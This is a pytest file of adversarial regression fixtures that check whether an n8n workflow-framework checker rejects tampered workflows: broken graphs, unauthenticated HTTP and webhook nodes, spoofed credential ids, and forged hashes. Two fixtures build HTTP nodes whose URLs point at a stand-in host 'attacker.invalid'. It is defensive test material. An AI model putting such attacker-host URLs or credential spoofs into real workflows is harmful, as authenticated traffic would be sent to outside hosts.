"""§23.24 checker — adversarial regression fixtures from the 2026-10-15 third-party audit (DD09, DD15, DD16).

Each fixture is a workflow that the checker at e355be188 scored wrongly (most of them 100%). The checker must now
refuse each one ON ITS OWN: no fixture relies on the generator's ``--check`` (the audit's point: a changed generator
can restamp its own outputs, and a hand-edited file can restamp its manifest hash and ``meta.graph_sha256``).

Hermetic: the reference workflow and real repo configs are read; mutated copies are written under ``tmp_path``
with their manifest row and graph hash re-stamped to match, so the hash checks see a "consistent" artifact. No n8n,
relay, gateway, ledger, DB or network.
"""

from __future__ import annotations

import copy
import dataclasses
import hashlib
import json
import shutil
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
sys.path.insert(0, str(ROOT))

import build_n8n_reference_workflow as REF  # noqa: E402
import check_n8n_workflow_framework as F  # noqa: E402
import n8n_workflow_templates as T  # noqa: E402

REF_REL = f"{REF.REL}/{REF.WID}.json"
LANE = REF.LANE  # aegis-nightly-ingestion: keyed in config/n8n_effect_keys.json with cron_claim + n8n_claim false


@pytest.fixture(scope="module")
def real_ctx() -> F.Context:
    return F.build_context(ROOT)


def _ref() -> dict:
    return json.loads((ROOT / REF_REL).read_text(encoding="utf-8"))


def _contract_doc() -> dict:
    return json.loads((ROOT / REF.REL / REF.CONTRACT_FILE).read_text(encoding="utf-8"))


def _restamp(
    tmp: Path, wf: dict, ctx: F.Context, contract_doc: dict | None = None, *, restamp_graph: bool = True
) -> tuple[F.Context, str, dict]:
    """Write ``wf`` where the reference lives under a tmp root, re-stamp its graph hash and manifest row (what an
    editor of the committed file would do), and return a context rooted there."""
    dst = tmp / REF.REL
    shutil.copytree(ROOT / REF.REL, dst, dirs_exist_ok=True)
    wf = copy.deepcopy(wf)
    if restamp_graph:
        wf.setdefault("meta", {})["graph_sha256"] = T.graph_hash(wf)
    text = T._dump(wf)
    (dst / f"{REF.WID}.json").write_text(text, encoding="utf-8")
    if contract_doc is not None:
        (dst / REF.CONTRACT_FILE).write_text(json.dumps(contract_doc, indent=2), encoding="utf-8")
    manifests = dict(ctx.manifests)
    manifests[REF_REL] = dict(
        manifests.get(REF_REL) or {},
        sha256=hashlib.sha256(text.encode("utf-8")).hexdigest(),
        graph_sha256=wf["meta"]["graph_sha256"],
        node_types=sorted({n["type"] for n in wf["nodes"]}),
        relay_calls=sorted({f"{m} {p}" for m, p in F.relay_calls(wf)}),
        error_workflow=(wf.get("settings") or {}).get("errorWorkflow"),
        _manifest="restamped INDEX.json",
    )
    return dataclasses.replace(ctx, root=tmp, manifests=manifests), REF_REL, wf


def _score(tmp, wf, ctx, *, entry=None, contract_doc=None, restamp_graph=True) -> dict:
    c, rel, stamped = _restamp(tmp, wf, ctx, contract_doc, restamp_graph=restamp_graph)
    return F.score_workflow(stamped, c, entry=entry, file=rel)


def _http(name: str, url: str, *, auth="genericCredentialType", cred=None, method="GET") -> dict:
    n = {
        "name": name,
        "type": "n8n-nodes-base.httpRequest",
        "typeVersion": 4.2,
        "retryOnFail": True,
        "parameters": {"method": method, "url": url, "genericAuthType": "httpHeaderAuth", "options": {}},
        "credentials": {"httpHeaderAuth": cred or {"id": T.CREDENTIAL_NAME, "name": T.CREDENTIAL_NAME}},
    }
    if auth is not None:
        n["parameters"]["authentication"] = auth
    return n


def _attach(wf: dict, node: dict, after: str = REF.N_OK) -> dict:
    wf["nodes"].append(node)
    wf["connections"][after] = {"main": [[{"node": node["name"], "type": "main", "index": 0}]]}
    return wf


RELAY_URL = "={{ $('Relay').first().json.TRADEAI_N8N_RUN_URL }}/status"


# ── fixture builders: name -> (workflow, entry, contract_doc) ───────────────────────────────────────────────────


def fx_disconnected():
    wf = _ref()
    wf["connections"] = {}
    return wf, None, None


def fx_run_lane_unreachable():
    wf = _ref()
    wf["connections"][REF.N_CTX] = {"main": [[{"node": REF.N_RECORD, "type": "main", "index": 0}]]}
    return wf, None, None


def fx_trigger_not_connected():
    wf = _ref()
    del wf["connections"][REF.N_SCHED]
    del wf["connections"][REF.N_MANUAL]
    return wf, None, None


def fx_dangling_connection():
    wf = _ref()
    wf["connections"][REF.N_ROUTE]["main"][2] = [{"node": "Ghost", "type": "main", "index": 0}]
    return wf, None, None


def fx_refusal_branch_throws():
    wf = _ref()
    for i in (2, 3):  # refused_policy, skipped_lock -> the throwing node: refusals become n8n errors (WS1b-07)
        wf["connections"][REF.N_ROUTE]["main"][i] = [{"node": REF.N_FAIL, "type": "main", "index": 0}]
    return wf, None, None


def fx_auth_none_with_stored_credential():
    return _attach(_ref(), _http("Status", RELAY_URL, auth="none")), None, None


def fx_auth_credential_id_spoof():
    cred = {"id": "attacker-cred", "name": T.CREDENTIAL_NAME}
    return _attach(_ref(), _http("Status", RELAY_URL, cred=cred)), None, None


def fx_origin_substring():
    url = "={{ 'https://attacker.invalid/?v=' + $('Relay').first().json.TRADEAI_N8N_RUN_URL }}/status"
    return _attach(_ref(), _http("Status", url)), None, None


def fx_effect_unarmed_canary():
    wf = _ref()
    wf["meta"]["framework"]["stage"] = "canary"
    return wf, {"stage": "canary", "mode": "live"}, None


def fx_effect_process_ghost():
    wf = _ref()
    wf["meta"]["framework"]["effect_process"] = "no-such-process"
    return wf, None, None


_JUDGE = {
    "node": "Judge",
    "process_id": "n8n_lane_failure_diagnosis",
    "template_id": "lane_failure_diagnosis.v1",
    "output_schema_id": "lane_failure_decision/v1",
    "branch_fields": ["action_id"],
    "offpeak_tier": "standard",
    "hitl": "none",
    "exception_branch": "Judge refused",
}


def fx_ai_ghost_node():
    wf = _ref()
    wf["meta"]["framework"]["class"] = "ai-llm"
    wf["meta"]["framework"]["llm_steps"] = [dict(_JUDGE)]
    return wf, None, None


def fx_ai_template_and_branch_mismatch():
    wf = _ref()
    wf["meta"]["framework"]["class"] = "ai-llm"
    wf["meta"]["framework"]["llm_steps"] = [
        dict(_JUDGE, node=REF.N_OK, template_id="material_digest_draft.v1", branch_fields=["cause"])
    ]
    return wf, None, None


def fx_runbook_ghost():
    wf = _ref()
    wf["meta"]["framework"]["runbook_id"] = "no-such-runbook"
    wf["meta"]["framework"]["runbook_path"] = f"{REF.REL}/INDEX.json"  # exists; is not a runbook for this id
    return wf, None, None


def fx_health_contract_id_ghost():
    wf = _ref()
    fw = wf["meta"]["framework"]
    del fw["health_contract_ref"]
    fw["health_contract_id"] = "no-such-contract"
    wf["meta"]["lane_id"] = LANE  # the old lookup fell through to the dispatcher's REVIEWED lane contract
    return wf, None, None


def fx_meta_copied_onto_noop_graph():
    ref = _ref()
    noop = T._f_code("wf-copy", "noop", "return [{ json: {} }];", [240, 0])
    sched = next(n for n in ref["nodes"] if n["name"] == REF.N_SCHED)
    wf = {
        "id": "wf-copy",
        "name": "wf-copy",
        "active": False,
        "nodes": [sched, noop],
        "connections": {REF.N_SCHED: {"main": [[{"node": "noop", "type": "main", "index": 0}]]}},
        "settings": dict(ref["settings"], errorWorkflow=T.FABRIC_ERROR_ID),
        "meta": copy.deepcopy(ref["meta"]),
    }
    return wf, None, None


def fx_expected_output_malformed():
    doc = _contract_doc()
    eo = doc["contract"]["expected_output"]
    eo.update(rule="empty_allowed", produced_field=7, unit=3, evidence=[{}], empty_allowed_reasons=[])
    return _ref(), None, doc


def fx_expected_output_bool_count():
    doc = _contract_doc()
    doc["contract"]["expected_output"].update(rule="per_window", min_produced=True, window_h=float("inf"))
    return _ref(), None, doc


# ── the auditor's own mutations (evidence/x/checker/run_audit.py + probe_disk.py at e355be188): each scored
#    27/27 there; each must fail here with its manifest row re-stamped to match ─────────────────────────────────


def _node(wf: dict, name: str) -> dict:
    return next(n for n in wf["nodes"] if n["name"] == name)


def ax_run_lane_disabled():
    wf = _ref()
    _node(wf, REF.N_RUN)["disabled"] = True
    return wf, None, None


def ax_run_lane_does_not_wait():
    wf = _ref()
    _node(wf, REF.N_RUN)["parameters"]["options"]["waitForSubWorkflow"] = False
    return wf, None, None


def ax_all_failures_route_to_success():
    wf = _ref()
    wf["connections"][REF.N_ROUTE]["main"] = [[{"node": REF.N_OK, "type": "main", "index": 0}] for _ in range(5)]
    return wf, None, None


def ax_bad_policy_and_graph_hash():
    wf = _ref()
    wf["meta"].update(graph_sha256="0" * 64, policy_sha256="0" * 64)
    return wf, None, None


def ax_return_success_without_output():
    wf = _ref()
    _node(wf, REF.N_OK)["parameters"]["jsCode"] = "return [{json:{status:'success',produced_count:0}}];"
    return wf, None, None


def _ax_extra_http(url: str) -> dict:
    wf = _ref()
    wf["nodes"].append(
        {
            "name": "Extra HTTP",
            "type": "n8n-nodes-base.httpRequest",
            "parameters": {"url": url, "authentication": "none", "genericAuthType": "httpHeaderAuth"},
            "retryOnFail": True,
            "credentials": {"httpHeaderAuth": {"name": T.CREDENTIAL_NAME, "id": T.CREDENTIAL_NAME}},
        }
    )
    return wf


def ax_unauthenticated_http():
    return _ax_extra_http("={{ $json.TRADEAI_N8N_RUN_URL }}/status"), None, None


def ax_unauthenticated_webhook():
    wf = _ref()
    wf["nodes"].append(
        {
            "name": "Unauthed inbound",
            "type": "n8n-nodes-base.webhook",
            "parameters": {"authentication": "none"},
            "credentials": {"httpHeaderAuth": {"name": T.CREDENTIAL_NAME, "id": T.CREDENTIAL_NAME}},
        }
    )
    return wf, None, None


def ax_foreign_url_marker():
    return _ax_extra_http('https://attacker.invalid/TRADEAI_N8N_RUN_URL/{{ "x" }}/status'), None, None


def fx_run_id_only_in_a_comment():
    wf = _ref()
    rec = _node(wf, REF.N_RECORD)["parameters"]
    marker = "$execution.customData.set('run_id'"
    rec["jsCode"] = rec["jsCode"].replace(marker, "/" + "/ " + marker)
    return wf, None, None


def fx_run_lane_call_retries_too():
    wf = _ref()
    _node(wf, REF.N_RUN)["retryOnFail"] = True
    return wf, None, None


NO_GRAPH_RESTAMP = {"audit_bad_policy_and_graph_hash"}

FIXTURES = {
    "audit_all_connections_removed": (fx_disconnected, ["FW-W2", "FW-W3", "FW-A4"]),
    "audit_run_lane_disabled": (ax_run_lane_disabled, ["FW-W2", "FW-W3", "FW-A4", "FW-R2"]),
    "audit_run_lane_does_not_wait": (ax_run_lane_does_not_wait, ["FW-W3"]),
    "audit_all_failures_route_to_success": (ax_all_failures_route_to_success, ["FW-W2", "FW-W3"]),
    "audit_bad_policy_and_graph_hash": (ax_bad_policy_and_graph_hash, ["FW-W4"]),
    "audit_return_success_without_output": (ax_return_success_without_output, ["FW-W3"]),
    "audit_unauthenticated_http": (ax_unauthenticated_http, ["FW-W2", "FW-S1"]),
    "audit_unauthenticated_webhook": (ax_unauthenticated_webhook, ["FW-S1"]),
    "audit_foreign_url_marker": (ax_foreign_url_marker, ["FW-L4", "FW-S1", "FW-S2"]),
    "run_id_only_in_a_comment": (fx_run_id_only_in_a_comment, ["~FW-M1"]),
    "run_lane_call_retries_too": (fx_run_lane_call_retries_too, ["FW-R1"]),
    "run_lane_unreachable": (fx_run_lane_unreachable, ["FW-W2", "FW-W3"]),
    "trigger_not_connected": (fx_trigger_not_connected, ["FW-W2"]),
    "dangling_connection": (fx_dangling_connection, ["FW-W1"]),
    "refusal_branch_throws": (fx_refusal_branch_throws, ["FW-A4"]),
    "auth_none_with_stored_credential": (fx_auth_none_with_stored_credential, ["FW-S1"]),
    "auth_credential_id_spoof": (fx_auth_credential_id_spoof, ["FW-S1", "FW-S3"]),
    "origin_substring_attacker_host": (fx_origin_substring, ["FW-L4", "FW-S2"]),
    "effect_unarmed_canary": (fx_effect_unarmed_canary, ["FW-R6"]),
    "effect_process_ghost": (fx_effect_process_ghost, ["FW-R6", "FW-W4"]),
    "ai_ghost_judge_node": (fx_ai_ghost_node, ["FW-W4", "FW-G1", "FW-G2", "FW-G4", "FW-G5", "FW-A5"]),
    "ai_template_and_branch_mismatch": (fx_ai_template_and_branch_mismatch, ["FW-W4", "FW-G1", "FW-G5"]),
    "runbook_ghost": (fx_runbook_ghost, ["FW-A6", "FW-R5"]),
    "health_contract_id_ghost": (fx_health_contract_id_ghost, ["FW-C3"]),
    "meta_copied_onto_noop_graph": (fx_meta_copied_onto_noop_graph, ["FW-W3", "FW-W4", "FW-C3"]),
    "expected_output_malformed": (fx_expected_output_malformed, ["FW-M6"]),
    "expected_output_bool_count_inf_window": (fx_expected_output_bool_count, ["FW-M6"]),
}


@pytest.mark.parametrize("name", sorted(FIXTURES))
def test_adversarial_fixture_fails_named_elements(name, real_ctx, tmp_path):
    build, must_fail = FIXTURES[name]
    wf, entry, doc = build()
    r = _score(tmp_path, wf, real_ctx, entry=entry, contract_doc=doc, restamp_graph=name not in NO_GRAPH_RESTAMP)
    # "~FW-X" = must not PASS (a PARTIAL is the honest verdict there); otherwise the element must FAIL
    statuses = {k: r["elements"][k.lstrip("~")]["status"] for k in must_fail}
    bad = {k: s for k, s in statuses.items() if (s == F.PASS if k.startswith("~") else s != F.FAIL)}
    assert not bad, (name, bad, {k: r["elements"][k.lstrip("~")] for k in bad})
    assert r["score"]["pct"] < 100.0
    assert r["failing"], name


def test_restamped_reference_without_mutation_still_passes(real_ctx, tmp_path):
    """Control: the restamp harness itself does not make a valid graph fail."""
    r = _score(tmp_path, _ref(), real_ctx)
    assert r["failing"] == [], {k: v for k, v in r["elements"].items() if v["status"] == F.FAIL}
    assert r["score"]["pct"] == 100.0


def test_disconnected_graph_fails_without_any_manifest_or_generator(real_ctx, tmp_path):
    """DD09: the structural verdict comes from the graph, not from L5 / manifests / the generator --check."""
    wf, _, _ = fx_disconnected()
    c = dataclasses.replace(real_ctx, manifests={}, renders={})
    r = F.score_workflow(wf, c, file=None)
    assert r["elements"]["FW-W2"]["status"] == F.FAIL and r["elements"]["FW-W3"]["status"] == F.FAIL
    assert r["elements"]["FW-A4"]["status"] == F.FAIL  # no reachable result routing
    assert r["elements"]["FW-M1"]["status"] != F.PASS  # the run_id node is unreachable: no join evidence


def test_l5_rerenders_instead_of_trusting_the_manifest(real_ctx, tmp_path):
    wf, _, _ = fx_disconnected()
    r = _score(tmp_path, wf, real_ctx)
    assert r["elements"]["FW-L5"]["status"] == F.FAIL and "render" in r["elements"]["FW-L5"]["reason"]
    assert r["integrity"]["regenerated_byte_equal"] is False


def test_effect_armed_lane_passes_canary(real_ctx, tmp_path):
    wf, entry, _ = fx_effect_unarmed_canary()
    specs = dict(real_ctx.effect_specs)
    specs[LANE] = dict(specs[LANE], n8n_claim=True, cron_claim=True)
    c = dataclasses.replace(real_ctx, effect_specs=specs)
    r = _score(tmp_path, wf, c, entry=entry)
    assert r["elements"]["FW-R6"]["status"] == F.PASS, r["elements"]["FW-R6"]


def _ai_graph() -> tuple[dict, F.Context]:
    """A well-formed AI step for the positive case: a reachable POST /llm_step node, its exception branch, a Switch
    on the enumerated field. /llm_step is not a relay route today (P), so the context adds it."""
    wf = _ref()
    body = (
        '={{ JSON.stringify({ process_id: "n8n_lane_failure_diagnosis", template_id: "lane_failure_diagnosis.v1", '
        'output_schema_id: "lane_failure_decision/v1", facts: $json, workflow_id: String($workflow.id), '
        "execution_id: String($execution.id) }) }}"
    )
    judge = _http("Judge", "={{ $('Relay').first().json.TRADEAI_N8N_RUN_URL }}/llm_step", method="POST")
    judge["parameters"].update(jsonBody=body, sendBody=True, specifyBody="json")
    judge["onError"] = "continueErrorOutput"
    refused = T._f_code(REF.WID, "Judge refused", "return [{ json: { status: 'refused' } }];", [0, 0])
    wf["nodes"] += [judge, refused]
    wf["connections"][REF.N_OK] = {"main": [[{"node": "Judge", "type": "main", "index": 0}]]}
    wf["connections"]["Judge"] = {"main": [[], [{"node": "Judge refused", "type": "main", "index": 0}]]}
    wf["meta"]["framework"]["class"] = "ai-llm"
    wf["meta"]["framework"]["llm_steps"] = [dict(_JUDGE)]
    return wf


def test_ai_step_bound_to_a_real_node_passes(real_ctx, tmp_path):
    wf = _ai_graph()
    c = dataclasses.replace(real_ctx, relay_routes=set(real_ctx.relay_routes) | {("POST", "/llm_step")})
    r = _score(tmp_path, wf, c)
    for k in ("FW-W4", "FW-A5", "FW-G1", "FW-G2", "FW-G3", "FW-G4", "FW-G5", "FW-G6"):
        assert r["elements"][k]["status"] == F.PASS, (k, r["elements"][k])
    # action_id is an action-bearing decision with hitl none: only the (runtime) host re-check guards it
    assert r["elements"]["FW-G7"]["status"] == F.PARTIAL and "action-bearing" in r["elements"]["FW-G7"]["reason"]
    # the AI(5) host re-check / grounding and AI(6) output scans are runtime obligations, never PASS offline
    assert {"23.24-AI5", "23.24-AI6"} <= {o["id"] for o in r["runtime"]}


def test_ai_template_of_another_process_and_non_enum_branch_fail(real_ctx, tmp_path):
    """A real, reachable LLM node whose declared template belongs to another process and whose branch field is
    free text: registry membership alone no longer passes FW-G1 / FW-G5."""
    wf = _ai_graph()
    judge = next(n for n in wf["nodes"] if n["name"] == "Judge")
    judge["parameters"]["jsonBody"] = judge["parameters"]["jsonBody"].replace(
        "lane_failure_diagnosis.v1", "material_digest_draft.v1"
    )
    wf["meta"]["framework"]["llm_steps"] = [
        dict(_JUDGE, template_id="material_digest_draft.v1", branch_fields=["cause"])
    ]
    c = dataclasses.replace(real_ctx, relay_routes=set(real_ctx.relay_routes) | {("POST", "/llm_step")})
    r = _score(tmp_path, wf, c)
    assert r["elements"]["FW-G1"]["status"] == F.FAIL and "bound to process" in r["elements"]["FW-G1"]["reason"]
    assert r["elements"]["FW-G5"]["status"] == F.FAIL and "not enumerated" in r["elements"]["FW-G5"]["reason"]
    assert r["elements"]["FW-W4"]["status"] == F.PASS  # the node is real; only the bindings are wrong


def test_ai_step_without_the_llm_route_fails_authz(real_ctx, tmp_path):
    r = _score(tmp_path, _ai_graph(), real_ctx)
    assert r["elements"]["FW-S2"]["status"] == F.FAIL and "/llm_step" in r["elements"]["FW-S2"]["reason"]


def test_undeclared_llm_call_fails(real_ctx, tmp_path):
    wf = _ai_graph()
    wf["meta"]["framework"]["llm_steps"] = []
    wf["meta"]["framework"]["class"] = "business-critical"
    c = dataclasses.replace(real_ctx, relay_routes=set(real_ctx.relay_routes) | {("POST", "/llm_step")})
    r = _score(tmp_path, wf, c)
    assert r["elements"]["FW-W4"]["status"] == F.FAIL


# ── DD16: the activation gate is fail-closed ─────────────────────────────────────────────────────────────────────


def test_strict_still_passes_reference_but_gate_refuses_it(capsys):
    ref = str(ROOT / REF_REL)
    assert F.main(["--strict", "--workflow", ref]) == 0
    capsys.readouterr()
    assert F.main(["--gate", "activation", "--json", "--workflow", ref]) == 1
    doc = json.loads(capsys.readouterr().out)
    g = doc["gate"]
    assert g["mode"] == "activation" and g["eligible"] is False
    reasons = " ".join(g["workflows"][0]["blocking"])
    assert "platform FW-P2" in reasons and "runtime 23.24-M1a" in reasons
    row = doc["workflows"][0]
    assert row["activation_eligibility"]["eligible"] is False
    assert row["deployed_parity"]["status"] == "UNPROVEN" and row["runtime_outcome"]["status"] == "UNPROVEN"


def test_gate_counts_partial_on_critical_elements(real_ctx):
    row = F.score_workflow(_ref(), real_ctx, file=REF_REL)
    row["elements"]["FW-C3"]["status"] = F.PARTIAL
    g = F.gate_workflow(row, platform=None, runtime_evidence={}, exceptions=[])
    assert any("FW-C3 partial" in b for b in g["blocking"])


def test_gate_accepts_only_unexpired_operator_exceptions(real_ctx):
    row = F.score_workflow(_ref(), real_ctx, file=REF_REL)
    row["elements"]["FW-C3"]["status"] = F.FAIL
    ok = {"workflow_id": REF.WID, "element": "FW-C3", "accepted_by": "operator", "pr": 1, "expires": "2099-01-01"}
    stale = dict(ok, expires="2000-01-01")
    agent = dict(ok, accepted_by="agent")
    for exc, excused in ((ok, True), (stale, False), (agent, False)):
        g = F.gate_workflow(row, platform=None, runtime_evidence={}, exceptions=[exc], today="2026-10-15")
        assert (not any(b.startswith("FW-C3") for b in g["blocking"])) is excused, exc


# ── §23.24 crosswalk ────────────────────────────────────────────────────────────────────────────────────────────


def test_every_obligation_maps_to_an_element_platform_fact_or_runtime_evidence():
    ids = {o["id"] for o in F.OBLIGATIONS}
    assert len(ids) == len(F.OBLIGATIONS)
    for o in F.OBLIGATIONS:
        assert o["kind"] in ("static", "platform", "not_checkable_offline"), o
        if o["kind"] == "static":
            assert o["elements"] and all(e in F.ELEMENTS for e in o["elements"]), o
        elif o["kind"] == "platform":
            assert o["elements"] and all(e in F.PLATFORM_ELEMENTS for e in o["elements"]), o
        else:
            assert o["evidence"], o
    # the obligations the audit named as absent or weakened are present, with what would prove them
    for oid in (
        "23.24-AI5",
        "23.24-AI6",
        "23.24-SEC5",
        "23.24-L3",
        "23.24-M3b",
        "23.24-M4b",
        "23.24-A2b",
        "23.24-R2b",
        "23.24-L5b",
        "23.24-BAR",
    ):
        assert oid in ids, oid


def test_crosswalk_is_in_the_contracts_design():
    doc = (ROOT / "docs/architecture/n8n/N8N_CONTRACTS_DESIGN.md").read_text(encoding="utf-8")
    for o in F.OBLIGATIONS:
        assert f"| {o['id']} |" in doc, o["id"]


def test_import_guard_framework_gate_is_mandatory_and_fail_closed(capsys):
    """An import packet cannot silently omit the active §23.24 activation bar."""
    import check_n8n_import_ready as G

    args = [str(ROOT / REF_REL), "--relay-url", T.GENERIC_RELAY_URL, "--known-id", T.FABRIC_ERROR_ID, "--json"]
    assert G.main(args) == 1
    capsys.readouterr()
    assert G.main(args + ["--framework-gate", "activation"]) == 1
    doc = json.loads(capsys.readouterr().out)
    row = doc["files"][0]
    assert "framework_gate" in row["refusals"] and row["framework_gate"]["eligible"] is False
